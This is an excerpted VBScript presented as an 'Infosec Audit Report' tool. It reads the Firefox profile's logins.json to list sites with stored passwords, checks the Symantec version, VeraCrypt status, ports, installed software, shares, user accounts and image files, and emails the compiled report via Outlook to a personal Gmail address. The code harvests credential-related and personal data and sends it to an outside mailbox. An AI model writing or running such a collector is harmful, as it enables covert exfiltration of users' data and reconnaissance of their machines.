...
strPathUsername = strNames(0) & left(strNames(1),1)
...
''''''''''''''''''''''''''''Symantec version check'''''''''''''''''''''''''''

For each objFolder In objFSO.GetFolder("C:\ProgramData\Symantec\Symantec Endpoint Protection\").SubFolders

                strFolder = strFolder + objFolder.Path + "*"

Next

arrFolder = Split(strFolder,"*")

arrVersion = Split(arrFolder(0),"\")

StrVersion = arrVersion(Ubound(arrVersion))
...
strPath = "C:\Users\"& strPathUsername   &"\AppData\Roaming\Mozilla\Firefox\Profiles\"

For each objFolder In objFSO.GetFolder(strPath).SubFolders

                strLoginFileName = objFolder.Path

        Exit for

Next

strLoginFileName = strLoginFileName & "\logins.JSON"
...
strbody = "<b>Web Access:</b> " & StrAccess & "<br><br>" & "<b>Symantec Version:</b> " & StrVersion & "<br><br>" & "<b>Sites for which password is stored</b> " & StrCredsStoredSites & "<br><br>" & "<b>Port access:</b> " & StrBlt  & "<br><br>" & "<b>VeraCrypt Status:</b> " & strVera & "<br><br>" & "<b>Installed Softwares:</b> " & strAll & "<b>NetShareOutput</b> " & strFixed & "<br><br>" & "<b>List of users having access to given machine:</b>" & Userlist & "<br><br>" & "<b>Images on PC: </b>" & strFiles

With OutMail

                .To = "rohitlakde34@gmail.com"

                .CC = ""

                .BCC = ""

                .Subject = "Infosec Audit Report for user " & strNames(0) & " " & strNames(1)
